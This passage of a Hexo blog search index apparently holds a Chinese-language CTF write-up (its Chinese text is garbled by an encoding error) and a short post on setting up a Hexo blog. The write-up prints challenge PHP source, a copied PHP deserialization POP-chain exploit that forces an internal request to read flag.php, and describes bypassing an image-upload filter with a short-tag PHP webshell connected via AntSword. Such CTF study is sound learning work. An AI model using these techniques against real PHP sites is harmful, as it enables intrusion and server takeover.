class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);  <span class="comment">//æ‰§è¡Œè¿™é‡Œ</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>loadfile()</code>å¯ä»¥è¿›è¡Œè·³è½¬ï¼Œå†è·Ÿ<code>loadfile()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();   <span class="comment">//è¿™é‡Œè¿›å…¥loadfileï¼Œæ­¤æ–¹æ³•åœ¨å°è¯•è°ƒç”¨ç±»æ–¹æ³•ï¼Œè€Œæ–¹æ³•ä¸å­˜åœ¨æ—¶è¢«è°ƒç”¨</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>__call</code>æ–¹æ³•å¯ä»¥è¿›è¡Œè·³è½¬ï¼Œæƒ³åŠæ³•è¿›å…¥è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">            <span class="comment">//$a-&gt;local=&quot;http://127.0.0.1:65500/&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>(); <span class="comment">//$this-&gt;a=new FileViewer();æ‰§è¡Œcæ–¹æ³•ä½†æ˜¯ FileViewerç±»æ²¡æœ‰cæ–¹æ³•è¿›å…¥callæ–¹æ³•</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨goodmanå‡½æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œè®©aä¸ºFileViewerç±»çš„å¯¹è±¡<code>b=&quot;local&quot;</code>ï¼Œç„¶åè®©Backdoorç±»ä¸‹<br><code>superhacker=&quot;http://127.0.0.1:65500/&quot;</code>å°±å¯ä»¥è¦†ç›–æˆåŠŸï¼Œaä¸ºFileViewerå¯¹è±¡ä½†è¿™ä¸ªç±»é‡Œé¢æ²¡æœ‰cæ–¹æ³•ï¼Œè¿›å…¥<code>__call</code>é­”æœ¯æ–¹æ³•ï¼Œ è¿™æ ·popé“¾æ„é€ å®Œæˆï¼Œä½†æ˜¯è¿™é‡Œæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ<br><img src="https://s1.ax1x.com/2022/11/08/xzuqMD.png" alt="xzuqMD.png"><br>ç›´æ¥ä¼ ç»™image_pathæ˜¯å¤±è´¥äº†çš„<br><img src="https://s1.ax1x.com/2022/11/08/xzu5I1.png" alt="xzu5I1.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuoPx.png" alt="xzuoPx.png"></p><p>è¿™ç¯‡åšå®¢æ‰“å¼€æ˜¯ç©ºçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¾—ä»è¿™é‡Œè¿›å…¥localfileï¼ŒåŸæ¥çš„é‚£æ¡é“¾å­å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œæˆ‘çš„ç†è§£æ˜¯è¿™æ ·çš„ï¼Œwpä¸­è¿™é‡Œæ²¡æœ‰å¤ªå¤šè§£é‡Š<br>expï¼šæ¥æºwp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$n</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$n</span>-&gt;a=<span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;superhacker=<span class="string">&quot;127.0.0.1:65500/&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;black_list=<span class="string">&quot;é»‘åå•ä»€ä¹ˆçš„ç®¡ä¸ç€æˆ‘&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;local=<span class="variable">$n</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;path=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰æ²¡å¤ªç†è§£æœ‰ç‚¹é—®é¢˜ï¼Œå…ˆè¿™æ ·å§<br>path_infoè¿›å…¥<br><img src="https://s1.ax1x.com/2022/11/08/xzu4aR.png" alt="xzu4aR.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuWqJ.png" alt="xzuWqJ.png"><br>è§£ç å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2022/11/08/xzuhZ9.png" alt="xzuhZ9.png"></p><h2 id="file-master"><a href="#file-master" class="headerlink" title="file_master"></a>file_master</h2><p>è¿›æ¥æœ‰ä¸ªæŸ¥çœ‹æ–‡ä»¶ï¼Œè¯•ä¸€ä¸‹index.php<br><img src="https://s1.ax1x.com/2022/11/08/xzKHkn.png" alt="xzKHkn.png"><br>æŸ¥çœ‹æºç <br><img src="https://s1.ax1x.com/2022/11/08/xzKbYq.png" alt="xzKbYq.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$whtie_list</span> = <span class="keyword">array</span>(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$filetype</span>,<span class="variable">$whtie_list</span>))&#123;</span><br><span class="line">            <span class="variable">$img_info</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$img_info</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$save_path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid file head&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;invalid file type!image/jpeg only!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;welcome.jpg&quot;</span>)).<span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼ ä¸€å¼ å›¾ç‰‡é©¬æ˜¾ç¤ºå¤ªå¤§äº†<br><img src="https://s1.ax1x.com/2022/11/08/xzKqf0.png" alt="xzKqf0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨defineæ”¹ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°è¿™ä¸­æ“ä½œï¼Œé¢˜åˆ·çš„å¤ªå°‘äº†<br><img src="https://s1.ax1x.com/2022/11/08/xzKowj.png" alt="xzKowj.png"><br>è¢«æ‹¦äº†ï¼Œè€Œä¸”æœ‰å»¶æ—¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                       <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                       @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¯•ä¸€ä¸‹çŸ­æ ‡ç­¾<br><img src="https://s1.ax1x.com/2022/11/08/xzKImQ.png" alt="xzKImQ.png"><br>ä¸Šä¼ æˆåŠŸï¼ŒPHPè¯•ä¸€ä¸‹<br><img src="https://s1.ax1x.com/2022/11/08/xzK4Og.png" alt="xzK4Og.png"><br>æˆåŠŸï¼Œè·¯å¾„ç›´æ¥æç¤ºäº†æ ¼å¼ï¼Œè¿èšå‰‘<br><img src="https://s1.ax1x.com/2022/11/08/xzKh6S.png" alt="xzKh6S.png"><br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿ä¸ä¸Šï¼Œè¿›å…¥æ–‡ä»¶å‘ç°æŠ¥é”™<br><a href="https://imgse.com/i/xzKfl8"><img src="https://s1.ax1x.com/2022/11/08/xzKfl8.png" alt="xzKfl8.png"></a><br>å¤šäº†ä¸€ä¸ª<code>&gt;</code>åˆ æ‰è¿æ¥æˆåŠŸï¼Œæ–‡ä»¶æ‰“ä¸å¼€ç›´æ¥è¿›ç»ˆç«¯<br><img src="https://s1.ax1x.com/2022/11/08/xzKTTs.png" alt="xzKTTs.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å‚è€ƒï¼š</p><p>(<a href="https://www.wd-ljt.com/post/1024/894.html">https://www.wd-ljt.com/post/1024/894.html</a>)       </p><p>è¿™ç¯‡å¤ç°é¸½äº†è¿™ä¹ˆä¹…ç»ˆäºå¼„å®Œäº†ï¼Œè¿™ç¯‡åšå®¢å›¾ç‰‡ä¸Šä¼ çš„çœŸä¸å®¹æ˜“å•Šï¼Œobsidainå¯¹å›¾ç‰‡çš„å¤„ç†çœŸçš„éº»çƒ¦ï¼Œå¾—æ‰¾ä¸ªæ’ä»¶è§£å†³ä¸€ä¸‹è¿™ä¸ªé—®é¢˜ï¼Œä¸ç„¶ä¸‹æ¬¡è¿˜å¾—ä¸€ä¸ªä¸ªé‡æ–°æˆªå›¾ä¿å­˜ä¸Šä¼ ï¼Œåšå®¢è¿˜ä¸å¤Ÿå®Œå–„ï¼Œå¯¼èˆªéƒ½è¿˜æ²¡å¼„ï¼Œæ‰¾ä¸ªæ—¶é—´å¼„å¼„å§</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åšå®¢æ­å»º</title>
      <link href="/2022/10/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/10/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h3>hexo+GitHubæ­å»º</h3><p>åŸºæœ¬æ­¥éª¤ç›´æ¥çœ‹è§†é¢‘<a href="https://www.bilibili.com/video/BV1mU4y1j72n?p=5&spm_id_from=pageDriver&vd_source=fdbccecc8d1a39a2449860e47c52b6e7">åœ°å€</a></p><p>å»ºè®®æ”¾åšå®¢çš„æ–‡ä»¶å¤¹ä¸è¦æ”¾ä¸­æ–‡ï¼Œæˆ‘åœ¨æ‰§è¡Œ<code>hexo init</code>æ—¶ä¸€ç›´æŠ¥é”™ï¼Œä½†æ˜¯æŠŠä¸­æ–‡åå»æ‰ä¹‹åå°±å¥½äº†</p><h3>ä¸»é¢˜è®¾ç½®</h3>æ‰“å¼€ä½ åˆ›å»ºçš„æ”¾åšå®¢å†…å®¹çš„æ–‡ä»¶å¤¹<p><img src="https://s1.ax1x.com/2022/10/05/xl26rF.md.png" alt="xl26rF.md.png"></p><p>æ‰“å¼€_config.ymlæ–‡ä»¶ï¼Œæˆ‘è¿™é‡Œç”¨vscodeæ‰“å¼€çš„</p><p><img src="https://s1.ax1x.com/2022/10/05/xlRZR0.png" alt="xlRZR0.png"></p><p>å°†themeåé¢çš„ä¸œè¥¿æ”¹ä¸ºä½ çš„ä¸»é¢˜åï¼Œä½ ä¸‹è½½å¥½çš„ä¸»é¢˜ååœ¨themesä¸­èƒ½çœ‹åˆ°ï¼Œè‡³äºæ€ä¹ˆä¸‹è½½å¯ä»¥åœ¨[å®˜ç½‘](<a href="https://hexo.io/themes/">Themes | Hexo</a>)é€‰ä¸€ä¸ªå–œæ¬¢çš„ä½¿ç”¨å‘½ä»¤ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨GitHubå°†æ–‡ä»¶ä¸‹è½½ç„¶åè§£å‹åˆ°themesæ–‡ä»¶é‡Œ</p><p><strong>æ‰§è¡Œhexoä¸‰è¿</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl //æ¸…é™¤ç¼“å­˜</span><br><span class="line">hexo g  //ç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œä¸ªäººç†è§£å°†mdè½¬ä¸ºhtml</span><br><span class="line">hexo s  //æœ¬åœ°é¢„è§ˆ</span><br></pre></td></tr></table></figure><p>æ»¡æ„ä¹‹åä¸Šçº¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><h3 id="ä¸»é¢˜çš„ä¸ªæ€§åŒ–"><a href="#ä¸»é¢˜çš„ä¸ªæ€§åŒ–" class="headerlink" title="ä¸»é¢˜çš„ä¸ªæ€§åŒ–"></a>ä¸»é¢˜çš„ä¸ªæ€§åŒ–</h3><p>è¿™ä¸€æ­¥æˆ‘æƒ³æ¢æˆ‘è‡ªå·±å–œæ¬¢çš„å›¾ç‰‡ï¼Œæ¨ªå¹…èƒŒæ™¯ï¼Œå¯¼èˆªæ logoï¼Œä½†æ˜¯ä¸€ç›´å¤±è´¥æŒ‰ç…§å®˜æ–¹æ–‡æ¡£é…ç½®ä¹Ÿä¸è¡Œï¼Œåªèƒ½ç”¨é»˜è®¤ï¼Œç­‰ä»¥åç ”ç©¶æ˜ç™½äº†å†å¼„ã€‚</p><h3 id="å›¾åºŠçš„ä½¿ç”¨"><a href="#å›¾åºŠçš„ä½¿ç”¨" class="headerlink" title="å›¾åºŠçš„ä½¿ç”¨"></a>å›¾åºŠçš„ä½¿ç”¨</h3><p>æˆ‘ç”¨çš„æ˜¯[è·¯è¿‡å›¾åºŠ](<a href="https://imgse.com/">è·¯è¿‡å›¾åºŠ - å…è´¹å›¾ç‰‡ä¸Šä¼ , ä¸“ä¸šå›¾ç‰‡å¤–é“¾, å…è´¹å…¬å…±å›¾åºŠ (imgse.com)</a>)çœ‹ç½‘ä¸Šçš„æ•™ç¨‹ä½¿ç”¨æ’ä»¶æ²¡æˆåŠŸï¼ŒPicgoè£…å¥½äº†å¯åŠ¨ä¸äº†å°±å¾ˆæ‡µ</p><p>ä½¿ç”¨ï¼šç›´æ¥æŠŠå›¾ç‰‡ä¸Šä¼ åˆ°å›¾åºŠä¸Šé¢ï¼Œç„¶åå¤åˆ¶ä¸‹é¢è¿™é‡Œçš„è¿æ¥å°±è¡Œ</p><p><img src="https://s1.ax1x.com/2022/10/05/xlWxu8.png" alt="xlWxu8.png"></p><p>æ€»ç»“</p><p>å¾ˆå¤šç»†èŠ‚è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œå¯èƒ½æ˜¯æˆ‘ä½¿ç”¨çš„ä¸»é¢˜æœ‰é—®é¢˜ä»¥åæ…¢æ…¢å†å¼„</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
